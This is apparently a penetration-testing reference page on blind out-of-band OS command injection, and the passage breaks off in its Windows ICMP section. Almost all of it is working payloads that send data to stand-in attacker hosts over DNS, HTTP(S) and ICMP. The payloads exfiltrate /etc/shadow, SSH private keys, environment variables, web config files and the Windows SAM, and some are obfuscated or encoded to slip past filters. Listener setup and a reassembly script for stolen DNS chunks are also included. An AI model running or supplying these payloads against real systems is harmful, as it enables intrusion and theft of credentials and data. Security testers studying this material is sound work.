---
title: OS Command Injection — Blind Out-of-Band
description: Blind Out-of-Band (OOB) OS Command Injection covering DNS, HTTP, ICMP, SMB, FTP exfiltration channels, data extraction techniques, encoding methods, multi-OS payloads, automation scripts, and tool usage.
navigation:
  icon: i-lucide-radio
  title: Blind OOB Command Injection
---

## Overview

Blind Out-of-Band (OOB) Command Injection occurs when injected commands execute on the target server but produce no visible output in the application response and no measurable timing difference. The attacker must force the target to initiate an outbound connection to an attacker-controlled server to confirm execution and exfiltrate data through an external channel.

::note
OOB is often the only viable technique when the application runs commands asynchronously, queues tasks, uses background workers, pipes output to `/dev/null`, or when WAFs block time-based delays. If in-band and time-based blind injection fail, always attempt OOB.
::

### Why OOB is Necessary

::card-group
  ::card
  ---
  title: No Output Reflection
  icon: i-lucide-eye-off
  ---
  Application discards all command output. Responses are identical regardless of success or failure of injected commands.
  ::

  ::card
  ---
  title: Asynchronous Execution
  icon: i-lucide-clock
  ---
  Commands execute in background workers, cron jobs, or message queues. Timing-based detection is unreliable because execution is decoupled from the HTTP response.
  ::

  ::card
  ---
  title: Output Redirection
  icon: i-lucide-arrow-right
  ---
  Application explicitly redirects stdout/stderr to `/dev/null` or log files. No way to observe output through the application interface.
  ::

  ::card
  ---
  title: WAF Blocking Timing
  icon: i-lucide-shield
  ---
  WAFs detect and block `sleep`, `ping`, `timeout`, and other delay commands. OOB uses allowed network utilities like `nslookup`, `curl`, or PowerShell cmdlets.
  ::

  ::card
  ---
  title: Firewall-Filtered Responses
  icon: i-lucide-shield-off
  ---
  Egress firewalls may block some protocols but allow DNS (port 53) or HTTPS (port 443), providing a covert channel for data exfiltration.
  ::

  ::card
  ---
  title: Confirmation Requirement
  icon: i-lucide-check-circle
  ---
  Pentest reports require proof of execution. OOB provides definitive evidence through attacker-controlled server logs showing the target's outbound connection.
  ::
::

### OOB Channel Comparison

| Channel | Port | Protocol | Egress Usually Allowed | Data Capacity | Stealth |
| --- | --- | --- | --- | --- | --- |
| DNS | 53 | UDP/TCP | ✅ Almost always | ~63 bytes per label | 🟢 High |
| HTTP/HTTPS | 80/443 | TCP | ✅ Usually | Unlimited | 🟡 Medium |
| ICMP | N/A | ICMP | 🟡 Sometimes | ~64 KB per packet | 🟢 High |
| SMB | 445 | TCP | 🔴 Rarely (Windows internal) | Unlimited | 🟡 Medium |
| FTP | 21 | TCP | 🔴 Rarely | Unlimited | 🔴 Low |
| SMTP | 25 | TCP | 🔴 Rarely | Unlimited | 🔴 Low |
| DNS over HTTPS | 443 | TCP | ✅ Usually | ~63 bytes per label | 🟢 High |

---

## Attacker Infrastructure Setup

Before injecting OOB payloads, set up listeners to capture incoming connections from the target.

### Listener Options

::tabs
  :::tabs-item{icon="i-lucide-globe" label="Burp Collaborator"}

  ```bash [Burp Collaborator — Easiest Method]
  # Built into Burp Suite Professional
  # 1. Burp Menu > Burp Collaborator Client
  # 2. Click "Copy to clipboard" to get a unique subdomain
  # 3. Use this subdomain in OOB payloads
  # 4. Click "Poll now" to check for incoming interactions

  # Example collaborator domain:
  # abcdef123456.burpcollaborator.net

  # Payload using it:
  ; nslookup abcdef123456.burpcollaborator.net
  ; curl http://abcdef123456.burpcollaborator.net

  # Collaborator captures:
  # - DNS lookups (with query content)
  # - HTTP requests (with headers, body, path)
  # - SMTP connections
  ```

  :::

  :::tabs-item{icon="i-lucide-terminal" label="Interactsh"}

  ```bash [Interactsh — Free Collaborator Alternative]
  # Install
  go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
  go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-server@latest

  # Run client (uses public server)
  interactsh-client

  # Output gives you a unique domain:
  # [INF] Listing 1 payload for OOB Testing
  # [INF] c23b2la0kl1krjcrdj10cndmnioyyyyyn.oast.pro

  # Use this domain in payloads
  ; nslookup c23b2la0kl1krjcrdj10cndmnioyyyyyn.oast.pro
  ; curl http://c23b2la0kl1krjcrdj10cndmnioyyyyyn.oast.pro/$(whoami)

  # Self-hosted server (full control)
  interactsh-server -domain oob.yourdomain.com -ip YOUR_SERVER_IP

  # Client connecting to self-hosted
  interactsh-client -s oob.yourdomain.com

  # With filtering
  interactsh-client -v -json -o interactions.json
  ```

  :::

  :::tabs-item{icon="i-lucide-terminal" label="Custom Listeners"}

  ```bash [Custom DNS Listener]
  # Simple DNS listener using Python
  sudo python3 << 'PYEOF'
  import socket, struct, datetime

  sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  sock.bind(('0.0.0.0', 53))
  print('[*] DNS listener started on port 53')

  while True:
      data, addr = sock.recvfrom(1024)
      # Parse query name from DNS packet
      domain = ''
      i = 12  # Skip DNS header
      while data[i] != 0:
          length = data[i]
          domain += data[i+1:i+1+length].decode(errors='replace') + '.'
          i += length + 1
      ts = datetime.datetime.now().strftime('%H:%M:%S')
      print(f'[{ts}] DNS query from {addr[0]}: {domain}')
  PYEOF
  ```

  ```bash [Custom HTTP Listener]
  # Simple HTTP listener
  python3 -m http.server 80

  # HTTP listener with request logging
  python3 << 'PYEOF'
  from http.server import HTTPServer, BaseHTTPRequestHandler
  import datetime

  class Handler(BaseHTTPRequestHandler):
      def do_GET(self):
          ts = datetime.datetime.now().strftime('%H:%M:%S')
          print(f'\n[{ts}] GET {self.path}')
          print(f'  From: {self.client_address[0]}')
          for k, v in self.headers.items():
              print(f'  {k}: {v}')
          self.send_response(200)
          self.end_headers()
          self.wfile.write(b'OK')

      def do_POST(self):
          ts = datetime.datetime.now().strftime('%H:%M:%S')
          length = int(self.headers.get('Content-Length', 0))
          body = self.rfile.read(length).decode(errors='replace')
          print(f'\n[{ts}] POST {self.path}')
          print(f'  From: {self.client_address[0]}')
          print(f'  Body: {body}')
          self.send_response(200)
          self.end_headers()
          self.wfile.write(b'OK')

      def log_message(self, format, *args):
          pass  # Suppress default logging

  HTTPServer(('0.0.0.0', 80), Handler).serve_forever()
  PYEOF
  ```

  ```bash [Netcat Listener]
  # Simple TCP listener
  nc -lvnp 80
  nc -lvnp 443
  nc -lvnp 4444

  # Loop listener (restarts after each connection)
  while true; do nc -lvnp 80; done

  # Ncat with TLS
  ncat --ssl -lvnp 443

  # Socat listener
  socat TCP-LISTEN:80,reuseaddr,fork STDOUT
  ```

  ```bash [ICMP Listener]
  # Capture ICMP packets
  sudo tcpdump -i eth0 icmp -X

  # More detailed ICMP capture
  sudo tcpdump -i eth0 'icmp and icmp[icmptype]=icmp-echo' -X -vv

  # Using tshark
  sudo tshark -i eth0 -f "icmp" -T fields -e ip.src -e data.data
  ```

  :::

  :::tabs-item{icon="i-lucide-cloud" label="Cloud Services"}

  ```bash [Cloud-Based OOB Receivers]
  # RequestBin (webhook.site)
  # 1. Go to https://webhook.site
  # 2. Copy unique URL
  # 3. Use in payloads:
  ; curl https://webhook.site/YOUR-UNIQUE-ID/$(whoami)

  # Pipedream
  # 1. Go to https://pipedream.com
  # 2. Create a webhook source
  # 3. Use the provided URL

  # Beeceptor
  # 1. Go to https://beeceptor.com
  # 2. Create an endpoint
  # 3. Use in payloads

  # Canarytokens (for DNS)
  # 1. Go to https://canarytokens.org
  # 2. Create a DNS token
  # 3. Use the generated hostname

  # AWS S3 + CloudTrail for logging
  # Create S3 bucket, use pre-signed URL in payload
  # CloudTrail logs the access

  # ngrok for tunneling
  ngrok http 80
  # Use the provided URL (e.g., https://abc123.ngrok.io)
  ; curl https://abc123.ngrok.io/$(whoami)
  ```

  :::
::

---

## DNS-Based Exfiltration

DNS is the most reliable OOB channel because DNS traffic (port 53) is almost never blocked by firewalls. Data is embedded in DNS query subdomain labels.

### DNS Exfiltration Fundamentals

::note
DNS labels have a maximum of 63 characters each, and the total domain name cannot exceed 253 characters. Data must be encoded to remove characters invalid in DNS names (only alphanumeric and hyphens are safe). Use `base64`, `hex`, or `tr` to sanitize.
::

### Basic DNS Confirmation

```bash [DNS Confirmation Payloads — Linux]
# Simple confirmation (does target make DNS queries?)
; nslookup ATTACKER.com
; dig ATTACKER.com
; host ATTACKER.com
; ping -c 1 ATTACKER.com
; curl http://ATTACKER.com
; wget http://ATTACKER.com

# With all separator types
| nslookup ATTACKER.com
& nslookup ATTACKER.com
&& nslookup ATTACKER.com
|| nslookup ATTACKER.com
`nslookup ATTACKER.com`
$(nslookup ATTACKER.com)
%0anslookup ATTACKER.com
%0a%0dnslookup ATTACKER.com

# Obfuscated (when nslookup/dig/host are blocked)
; /usr/bin/nslookup ATTACKER.com
; n''s''l''o''o''k''u''p ATTACKER.com
; n\sl\oo\ku\p ATTACKER.com
; $'\x6e\x73\x6c\x6f\x6f\x6b\x75\x70' ATTACKER.com
; $(printf '\x6e\x73\x6c\x6f\x6f\x6b\x75\x70') ATTACKER.com

# Using ping for DNS resolution
; ping -c 1 ATTACKER.com
; ping${IFS}-c${IFS}1${IFS}ATTACKER.com

# Using curl/wget (triggers DNS + HTTP)
; curl ATTACKER.com
; wget ATTACKER.com
```

```bash [DNS Confirmation Payloads — Windows]
:: Basic DNS lookup
& nslookup ATTACKER.com
& ping -n 1 ATTACKER.com
& certutil -urlcache -split -f http://ATTACKER.com/test
& powershell Resolve-DnsName ATTACKER.com
& powershell -c "Invoke-WebRequest http://ATTACKER.com"
& powershell -c "[System.Net.Dns]::GetHostAddresses('ATTACKER.com')"

:: Obfuscated
& n^s^l^o^o^k^u^p ATTACKER.com
& p^i^n^g -n 1 ATTACKER.com
& pow^ersh^ell Resolve-DnsName ATTACKER.com

:: Using cmd
& cmd /c nslookup ATTACKER.com
& cmd /c ping -n 1 ATTACKER.com
```

### DNS Data Exfiltration

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Linux — Single Values"}

  ```bash [Exfiltrate Single Values via DNS]
  # Exfiltrate whoami
  ; nslookup $(whoami).ATTACKER.com
  ; dig $(whoami).ATTACKER.com
  ; host $(whoami).ATTACKER.com
  ; ping -c 1 $(whoami).ATTACKER.com

  # Exfiltrate hostname
  ; nslookup $(hostname).ATTACKER.com
  ; dig $(cat /etc/hostname).ATTACKER.com

  # Exfiltrate current user ID
  ; nslookup $(id -u).ATTACKER.com

  # Exfiltrate OS info
  ; nslookup $(uname -s).ATTACKER.com
  ; nslookup $(uname -r | tr '.' '-').ATTACKER.com

  # Exfiltrate IP address
  ; nslookup $(hostname -I | tr ' ' '-').ATTACKER.com
  ; nslookup $(ifconfig eth0 | grep 'inet ' | awk '{print $2}').ATTACKER.com

  # Exfiltrate current directory
  ; nslookup $(pwd | tr '/' '-').ATTACKER.com

  # Using backticks instead of $()
  ; nslookup `whoami`.ATTACKER.com
  ; dig `hostname`.ATTACKER.com

  # Using curl to trigger DNS
  ; curl $(whoami).ATTACKER.com
  ; curl http://$(whoami).ATTACKER.com

  # Sanitize output for DNS (remove invalid chars)
  ; nslookup $(whoami | tr -cd 'a-zA-Z0-9-').ATTACKER.com
  ; nslookup $(hostname | tr '.' '-' | tr -cd 'a-zA-Z0-9-').ATTACKER.com
  ```

  :::

  :::tabs-item{icon="i-lucide-monitor" label="Windows — Single Values"}

  ```cmd [Exfiltrate Single Values via DNS — Windows]
  :: Exfiltrate username
  & nslookup %USERNAME%.ATTACKER.com
  & ping -n 1 %USERNAME%.ATTACKER.com

  :: Exfiltrate computer name
  & nslookup %COMPUTERNAME%.ATTACKER.com

  :: Exfiltrate domain
  & nslookup %USERDOMAIN%.ATTACKER.com

  :: PowerShell exfiltration
  & powershell -c "Resolve-DnsName ($env:USERNAME+'.ATTACKER.com')"
  & powershell -c "Resolve-DnsName ($env:COMPUTERNAME+'.ATTACKER.com')"
  & powershell -c "nslookup ($env:USERNAME+'.ATTACKER.com')"

  :: Exfiltrate whoami output
  & for /f %i in ('whoami') do nslookup %i.ATTACKER.com

  :: Exfiltrate IP address
  & for /f "tokens=2 delims=:" %i in ('ipconfig ^| findstr IPv4') do nslookup %i.ATTACKER.com

  :: PowerShell with sanitization
  & powershell -c "$d=whoami; $d=$d -replace '[^a-zA-Z0-9-]','-'; Resolve-DnsName ($d+'.ATTACKER.com')"
  ```

  :::

  :::tabs-item{icon="i-lucide-terminal" label="Hex/Base64 Encoding"}

  ```bash [Encoded DNS Exfiltration — Linux]
  # Hex-encoded exfiltration (handles special chars)
  ; nslookup $(whoami | xxd -p).ATTACKER.com
  ; nslookup $(hostname | xxd -p).ATTACKER.com
  ; nslookup $(id | xxd -p | head -c 60).ATTACKER.com

  # Base64-encoded (remove = and + which are invalid in DNS)
  ; nslookup $(whoami | base64 | tr '+/=' '-_0').ATTACKER.com
  ; nslookup $(hostname | base64 | tr '+/=' '-_0').ATTACKER.com

  # Base32-encoded (DNS-safe by default)
  ; nslookup $(whoami | base32 | tr '=' '0').ATTACKER.com

  # Hex with nslookup
  ; nslookup $(cat /etc/hostname | od -A n -tx1 | tr -d ' \n' | head -c 60).ATTACKER.com

  # URL-safe encoding
  ; nslookup $(whoami | tr -cd 'a-zA-Z0-9' ).ATTACKER.com
  ```

  ```powershell [Encoded DNS Exfiltration — Windows PowerShell]
  # Hex encoding
  & powershell -c "$d=[BitConverter]::ToString([Text.Encoding]::UTF8.GetBytes((whoami))).Replace('-',''); Resolve-DnsName ($d+'.ATTACKER.com')"

  # Base64 encoding (DNS-safe)
  & powershell -c "$d=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes((whoami))).Replace('+','-').Replace('/','_').Replace('=',''); Resolve-DnsName ($d+'.ATTACKER.com')"
  ```

  :::
::

### Multi-Line / Large Data DNS Exfiltration

For exfiltrating multi-line data like `/etc/passwd`, file contents, or command output that exceeds DNS label limits.

::tabs
  :::tabs-item{icon="i-lucide-file-text" label="Chunked Exfiltration"}

  ```bash [Chunked DNS Exfiltration — Linux]
  # Line-by-line exfiltration of /etc/passwd
  ; for line in $(cat /etc/passwd); do nslookup $line.ATTACKER.com; done

  # Line-by-line with line number prefix
  ; cat /etc/passwd | while IFS= read -r line; do
      nslookup "$(echo $line | tr -cd 'a-zA-Z0-9-' | head -c 60).ATTACKER.com"
    done

  # Hex-encoded line-by-line
  ; i=0; cat /etc/passwd | while IFS= read -r line; do
      hex=$(echo "$line" | xxd -p | tr -d '\n' | head -c 60);
      nslookup "${i}-${hex}.ATTACKER.com";
      i=$((i+1));
    done

  # Fixed-size chunk exfiltration
  ; cat /etc/passwd | xxd -p | tr -d '\n' | fold -w 60 | while IFS= read -r chunk; do
      nslookup "${chunk}.ATTACKER.com";
      sleep 0.5;
    done

  # With sequence numbers for reassembly
  ; cat /etc/passwd | base64 -w0 | tr '+/=' '-_0' | fold -w 50 | \
    nl -ba -w3 -s'-' | while IFS= read -r line; do
      nslookup "${line}.ATTACKER.com";
      sleep 0.3;
    done

  # Using dig instead of nslookup
  ; data=$(cat /etc/passwd | base64 -w0 | tr '+/=' '-_0'); \
    for i in $(seq 0 50 ${#data}); do
      chunk="${data:$i:50}";
      dig "${i}-${chunk}.ATTACKER.com";
      sleep 0.3;
    done

  # Exfiltrate specific file
  ; cat /etc/shadow | xxd -p | fold -w 60 | while read c; do dig $c.ATTACKER.com; sleep 0.5; done
  ; cat /var/www/html/config.php | xxd -p | fold -w 60 | while read c; do host $c.ATTACKER.com; sleep 0.3; done

  # Exfiltrate directory listing
  ; ls -la | xxd -p | fold -w 60 | while read c; do nslookup $c.ATTACKER.com; done

  # Exfiltrate environment variables
  ; env | xxd -p | fold -w 60 | while read c; do dig $c.ATTACKER.com; sleep 0.3; done
  ```

  :::

  :::tabs-item{icon="i-lucide-monitor" label="Windows Chunked"}

  ```powershell [Chunked DNS Exfiltration — Windows]
  # PowerShell chunked exfiltration
  & powershell -c "$data=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes((Get-Content C:\Users\Administrator\flag.txt))).Replace('+','-').Replace('/','_').Replace('=',''); for($i=0;$i -lt $data.Length;$i+=50){$chunk=$data.Substring($i,[Math]::Min(50,$data.Length-$i)); Resolve-DnsName (\"$i-$chunk.ATTACKER.com\") -ErrorAction SilentlyContinue}"

  # Line by line from file
  & powershell -c "Get-Content C:\Windows\System32\drivers\etc\hosts | ForEach-Object { $hex=[BitConverter]::ToString([Text.Encoding]::UTF8.GetBytes($_)).Replace('-',''); nslookup \"$hex.ATTACKER.com\" 2>$null }"

  # Exfiltrate systeminfo
  & powershell -c "$d=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes((systeminfo))).Replace('+','-').Replace('/','_').Replace('=',''); for($i=0;$i -lt $d.Length;$i+=50){nslookup ($i.ToString()+'-'+$d.Substring($i,[Math]::Min(50,$d.Length-$i))+'.ATTACKER.com') 2>$null; Start-Sleep -Milliseconds 300}"

  # CMD loop exfiltration
  & for /f "delims=" %a in ('whoami') do nslookup %a.ATTACKER.com
  & for /f "delims=" %a in ('ipconfig') do nslookup %a.ATTACKER.com
  ```

  :::

  :::tabs-item{icon="i-lucide-code" label="Reassembly Script"}

  ```python [dns_reassemble.py]
  #!/usr/bin/env python3
  """
  Reassemble data exfiltrated via DNS chunked queries.
  Feed this script the captured DNS query log.
  """
  import sys
  import re
  import base64
  import binascii

  def reassemble_hex(queries):
      """Reassemble hex-encoded chunks."""
      # Sort by sequence number if present
      chunks = {}
      for q in queries:
          # Pattern: SEQ-HEXDATA.attacker.com
          match = re.match(r'(\d+)-([a-fA-F0-9]+)\.', q)
          if match:
              seq = int(match.group(1))
              data = match.group(2)
              chunks[seq] = data
          else:
              # No sequence number — try plain hex
              match = re.match(r'([a-fA-F0-9]+)\.', q)
              if match:
                  chunks[len(chunks)] = match.group(1)

      # Reassemble in order
      full_hex = ''
      for key in sorted(chunks.keys()):
          full_hex += chunks[key]

      try:
          return binascii.unhexlify(full_hex).decode(errors='replace')
      except:
          return full_hex

  def reassemble_base64(queries):
      """Reassemble base64-encoded chunks."""
      chunks = {}
      for q in queries:
          match = re.match(r'(\d+)-([a-zA-Z0-9\-_0]+)\.', q)
          if match:
              seq = int(match.group(1))
              data = match.group(2)
              # Restore base64 padding
              data = data.replace('-', '+').replace('_', '/').replace('0', '=')
              chunks[seq] = data

      full_b64 = ''
      for key in sorted(chunks.keys()):
          full_b64 += chunks[key]

      # Fix padding
      padding = 4 - (len(full_b64) % 4)
      if padding != 4:
          full_b64 += '=' * padding

      try:
          return base64.b64decode(full_b64).decode(errors='replace')
      except:
          return full_b64

  if __name__ == '__main__':
      if len(sys.argv) < 2:
          print(f"Usage: {sys.argv[0]} <dns_log_file> [hex|base64]")
          sys.exit(1)

      encoding = sys.argv[2] if len(sys.argv) > 2 else 'hex'

      with open(sys.argv[1]) as f:
          queries = [line.strip() for line in f if line.strip()]

      if encoding == 'hex':
          print(reassemble_hex(queries))
      elif encoding == 'base64':
          print(reassemble_base64(queries))
      else:
          print(f"Unknown encoding: {encoding}")
  ```

  :::
::

### DNS Exfiltration Without Common Tools

When `nslookup`, `dig`, `host` are unavailable or blocked.

::collapsible

```bash [DNS Exfiltration Without Standard Tools]
# Using ping (triggers DNS resolution)
; ping -c 1 $(whoami).ATTACKER.com
; ping -c 1 $(hostname).ATTACKER.com

# Using curl (triggers DNS)
; curl http://$(whoami).ATTACKER.com
; curl $(hostname).ATTACKER.com

# Using wget
; wget http://$(whoami).ATTACKER.com -O /dev/null

# Using /dev/tcp (bash built-in — no external tools)
; echo > /dev/tcp/$(whoami).ATTACKER.com/80
; echo > /dev/udp/$(whoami).ATTACKER.com/53
; bash -c "echo > /dev/tcp/$(whoami).ATTACKER.com/80"

# Using Python
; python3 -c "import socket; socket.getaddrinfo('$(whoami).ATTACKER.com', 80)"
; python3 -c "__import__('socket').getaddrinfo('$(whoami).ATTACKER.com',80)"
; python -c "import socket; socket.gethostbyname('$(whoami).ATTACKER.com')"

# Using Perl
; perl -e 'use Socket; gethostbyname("'$(whoami)'.ATTACKER.com")'

# Using Ruby
; ruby -e "require 'resolv'; Resolv.getaddress('$(whoami).ATTACKER.com')"

# Using PHP
; php -r "dns_get_record('$(whoami).ATTACKER.com');"
; php -r "gethostbyname('$(whoami).ATTACKER.com');"

# Using Node.js
; node -e "require('dns').resolve('$(whoami).ATTACKER.com',()=>{})"

# Using Java
; jrunscript -e "java.net.InetAddress.getByName('$(whoami).ATTACKER.com')"

# Using nmap (if available)
; nmap --dns-servers ATTACKER_DNS_IP -sL $(whoami).ATTACKER.com

# Using traceroute (triggers DNS)
; traceroute $(whoami).ATTACKER.com

# Using telnet
; telnet $(whoami).ATTACKER.com 80

# Raw DNS query using printf and /dev/udp (bash-only)
; (echo -ne '\x00\x01\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00'; \
   echo -ne '\x04test\x08ATTACKER\x03com\x00\x00\x01\x00\x01') \
   > /dev/udp/8.8.8.8/53
```

::

---

## HTTP-Based Exfiltration

HTTP provides higher data capacity than DNS and supports exfiltrating large files, binary data, and structured output.

### HTTP GET Exfiltration

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Linux"}

  ```bash [HTTP GET Exfiltration — Linux]
  # Basic exfiltration via URL path
  ; curl http://ATTACKER.com/$(whoami)
  ; curl http://ATTACKER.com/$(hostname)
  ; curl http://ATTACKER.com/$(id|base64)

  # Exfiltrate via query parameters
  ; curl "http://ATTACKER.com/exfil?user=$(whoami)"
  ; curl "http://ATTACKER.com/exfil?host=$(hostname)&user=$(whoami)&id=$(id -u)"

  # URL-encoded data
  ; curl "http://ATTACKER.com/exfil?d=$(cat /etc/passwd | base64 -w0 | tr '+/=' '-_0')"
  ; curl "http://ATTACKER.com/exfil?d=$(cat /etc/passwd | xxd -p | tr -d '\n')"

  # Using wget
  ; wget "http://ATTACKER.com/$(whoami)" -O /dev/null
  ; wget "http://ATTACKER.com/exfil?d=$(id|base64 -w0)" -O /dev/null -q

  # Using /dev/tcp
  ; exec 3<>/dev/tcp/ATTACKER.com/80; echo -e "GET /$(whoami) HTTP/1.1\r\nHost: ATTACKER.com\r\n\r\n" >&3

  # Using Python
  ; python3 -c "import urllib.request; urllib.request.urlopen('http://ATTACKER.com/'+__import__('os').popen('whoami').read().strip())"

  # Using Perl
  ; perl -e 'use LWP::Simple; get("http://ATTACKER.com/".`whoami`)'

  # Space and special char bypass with ${IFS}
  ; curl${IFS}http://ATTACKER.com/$(whoami)
  ; wget${IFS}http://ATTACKER.com/$(whoami)${IFS}-O${IFS}/dev/null
  ```

  :::

  :::tabs-item{icon="i-lucide-monitor" label="Windows"}

  ```powershell [HTTP GET Exfiltration — Windows]
  # PowerShell
  & powershell -c "Invoke-WebRequest ('http://ATTACKER.com/exfil?d='+$env:USERNAME)"
  & powershell -c "IWR http://ATTACKER.com/$env:USERNAME"
  & powershell -c "(New-Object Net.WebClient).DownloadString('http://ATTACKER.com/'+(whoami))"

  # certutil (generates DNS + HTTP)
  & certutil -urlcache -split -f http://ATTACKER.com/%USERNAME% C:\Windows\Temp\null

  # bitsadmin
  & bitsadmin /transfer j http://ATTACKER.com/%USERNAME% C:\Windows\Temp\null

  # mshta
  & mshta http://ATTACKER.com/%USERNAME%

  # CMD with FOR loop
  & for /f %i in ('whoami') do certutil -urlcache -split -f http://ATTACKER.com/%i C:\Windows\Temp\null

  # Obfuscated PowerShell
  & p^ow^ers^hell -c "IWR http://ATTACKER.com/$env:USERNAME"
  & powershell -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcAA6AC8ALwBBAFQAVABBAEMASwBFAFIALgBjAG8AbQA=
  ```

  :::
::

### HTTP POST Exfiltration (Large Data)

::tabs
  :::tabs-item{icon="i-lucide-upload" label="POST — Linux"}

  ```bash [HTTP POST Exfiltration — Linux]
  # POST raw data
  ; curl -X POST -d "$(whoami)" http://ATTACKER.com/collect
  ; curl -X POST -d "$(cat /etc/passwd)" http://ATTACKER.com/collect
  ; curl -X POST -d "$(id)" http://ATTACKER.com/collect

  # POST base64-encoded file
  ; curl -X POST -d "$(cat /etc/passwd | base64 -w0)" http://ATTACKER.com/collect
  ; curl -X POST -d "$(cat /etc/shadow | base64 -w0)" http://ATTACKER.com/collect

  # POST with filename header
  ; curl -X POST -d @/etc/passwd http://ATTACKER.com/collect
  ; curl -X POST -d @/etc/shadow http://ATTACKER.com/collect

  # Upload file via multipart form
  ; curl -F "file=@/etc/passwd" http://ATTACKER.com/upload
  ; curl -F "file=@/etc/shadow" http://ATTACKER.com/upload
  ; curl -F "file=@/var/www/html/config.php" http://ATTACKER.com/upload

  # POST environment variables
  ; curl -X POST -d "$(env)" http://ATTACKER.com/collect

  # POST process list
  ; curl -X POST -d "$(ps aux)" http://ATTACKER.com/collect

  # POST network info
  ; curl -X POST -d "$(ifconfig)" http://ATTACKER.com/collect
  ; curl -X POST -d "$(netstat -tulpn)" http://ATTACKER.com/collect
  ; curl -X POST -d "$(ss -tulpn)" http://ATTACKER.com/collect

  # POST SSH keys
  ; curl -X POST -d "$(cat ~/.ssh/id_rsa)" http://ATTACKER.com/collect
  ; curl -X POST -d "$(cat ~/.ssh/authorized_keys)" http://ATTACKER.com/collect

  # POST with JSON format
  ; curl -X POST -H "Content-Type: application/json" \
    -d "{\"user\":\"$(whoami)\",\"host\":\"$(hostname)\",\"data\":\"$(cat /etc/passwd | base64 -w0)\"}" \
    http://ATTACKER.com/collect

  # Using wget for POST
  ; wget --post-data="$(cat /etc/passwd)" http://ATTACKER.com/collect -O /dev/null -q
  ; wget --post-data="$(env | base64 -w0)" http://ATTACKER.com/collect -O /dev/null

  # Using Python
  ; python3 -c "import urllib.request; urllib.request.urlopen(urllib.request.Request('http://ATTACKER.com/collect', data=open('/etc/passwd','rb').read()))"

  # Using Perl
  ; perl -MLWP::UserAgent -e '$ua=LWP::UserAgent->new;$ua->post("http://ATTACKER.com/collect",Content=>scalar `cat /etc/passwd`)'
  ```

  :::

  :::tabs-item{icon="i-lucide-upload" label="POST — Windows"}

  ```powershell [HTTP POST Exfiltration — Windows]
  # PowerShell POST
  & powershell -c "Invoke-WebRequest -Uri http://ATTACKER.com/collect -Method POST -Body (whoami)"
  & powershell -c "IWR http://ATTACKER.com/collect -Method POST -Body (Get-Content C:\flag.txt)"

  # POST systeminfo
  & powershell -c "IWR http://ATTACKER.com/collect -Method POST -Body (systeminfo)"

  # POST encoded file
  & powershell -c "$d=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\Users\Administrator\Desktop\flag.txt')); IWR http://ATTACKER.com/collect -Method POST -Body $d"

  # POST SAM/SYSTEM hashes (requires SYSTEM privileges)
  & powershell -c "$d=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\Windows\System32\config\SAM')); IWR http://ATTACKER.com/collect -Method POST -Body $d"

  # Using .NET WebClient
  & powershell -c "(New-Object Net.WebClient).UploadString('http://ATTACKER.com/collect', (whoami))"
  & powershell -c "(New-Object Net.WebClient).UploadString('http://ATTACKER.com/collect', (Get-Process | Out-String))"

  # Using certutil + bitsadmin (no direct POST, but file creation for pickup)
  & whoami > C:\Windows\Temp\out.txt & certutil -urlcache -split -f http://ATTACKER.com/notify C:\Windows\Temp\null
  ```

  :::
::

### HTTPS Exfiltration (Encrypted Channel)

```bash [HTTPS Exfiltration — Evades Network Inspection]
# Using curl with HTTPS (encrypted — IDS/IPS can't see payload)
; curl -k https://ATTACKER.com/collect -d "$(cat /etc/passwd)"
; curl -k "https://ATTACKER.com/exfil?d=$(whoami)"

# Using wget with HTTPS
; wget --no-check-certificate "https://ATTACKER.com/exfil?d=$(whoami)" -O /dev/null

# Using openssl s_client for raw TLS connection
; echo "$(whoami)" | openssl s_client -connect ATTACKER.com:443 -quiet 2>/dev/null

# Using Python with HTTPS
; python3 -c "import urllib.request,ssl; ctx=ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE; urllib.request.urlopen('https://ATTACKER.com/'+__import__('os').popen('whoami').read().strip(), context=ctx)"

# Windows PowerShell HTTPS
& powershell -c "[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true}; IWR https://ATTACKER.com/collect -Method POST -Body (whoami)"
```

---

## ICMP-Based Exfiltration

ICMP echo requests (ping) can carry arbitrary data in the payload field. Useful when HTTP and DNS are blocked.

::tabs
  :::tabs-item{icon="i-lucide-radio" label="Linux ICMP"}

  ```bash [ICMP Exfiltration — Linux]
  # Basic ping with hostname (triggers DNS + ICMP)
  ; ping -c 1 $(whoami).ATTACKER.com

  # Ping with custom data payload (-p flag)
  # -p takes hex data to fill the packet payload
  ; ping -c 1 -p $(whoami | xxd -p | head -c 32) ATTACKER_IP
  ; ping -c 1 -p $(hostname | xxd -p | head -c 32) ATTACKER_IP
  ; ping -c 1 -p $(id | xxd -p | head -c 32) ATTACKER_IP

  # Chunked ICMP exfiltration
  ; cat /etc/passwd | xxd -p | fold -w 32 | while read chunk; do
      ping -c 1 -p "$chunk" ATTACKER_IP;
      sleep 0.5;
    done

  # Using nping (from nmap suite) for custom ICMP data
  ; nping --icmp -c 1 --data-string "$(whoami)" ATTACKER_IP

  # Using hping3
  ; hping3 -1 -c 1 -d 100 --file /etc/passwd ATTACKER_IP
  ; hping3 -1 -c 1 -e "$(whoami)" ATTACKER_IP

  # Python ICMP (requires root)
  ; python3 -c "
  import socket, struct
  data = b'$(whoami)'
  sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
  checksum = 0
  header = struct.pack('!BBHHH', 8, 0, checksum, 1, 1)
  packet = header + data
  sock.sendto(packet, ('ATTACKER_IP', 0))
  "
  ```

  :::

  :::tabs-item{icon="i-lucide-monitor" label="Windows ICMP"}

  ```powershell [ICMP Exfiltration — Windows]
  # Basic ping (triggers DNS resolution for hostnames)
  & ping -n 1 %USERNAME%.ATTACKER.com

  # PowerShell custom ICMP payload
